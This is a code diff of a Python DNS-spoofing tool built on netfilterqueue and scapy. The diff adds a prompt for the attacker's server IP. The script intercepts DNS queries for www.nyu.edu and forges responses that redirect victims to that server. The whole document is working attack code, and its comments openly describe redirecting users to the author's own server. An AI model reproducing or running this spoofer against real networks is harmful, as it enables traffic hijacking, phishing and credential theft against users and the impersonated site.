@@ -1,6 +1,9 @@
 #!/usr/bin/env python
 import netfilterqueue
 import scapy.all as scapy
+from pip._vendor.distlib.compat import raw_input
+
+ip_address = raw_input("[+] Enter IP address of the server: ")
 
 def spoofed_packet(packets):
     scapy_packet = scapy.IP(packets.get_payload()) # converting packet to scapy packet i.e. IP layer
@@ -8,7 +11,7 @@ def spoofed_packet(packets):
         qname = scapy_packet[scapy.DNSQR].qname # if the victim is looking for the target website, qname is the website
         if "www.nyu.edu" in qname: # To check if the website is in the qname
             print("[+] Spoofing target")
-            spoof_ans = scapy.DNSRR(rrname=qname, rdata="Set IP address of your server") # To redirect the user to nyu.edu to my server
+            spoof_ans = scapy.DNSRR(rrname=qname, rdata=ip_address) # To redirect the user to nyu.edu to my server
                                                                        # Where rrname is equal to the qname
                                                                        # P.S We are creating a DNS RESPONSE
             scapy_packet[scapy.DNS].an = spoof_ans # Modifying answer field
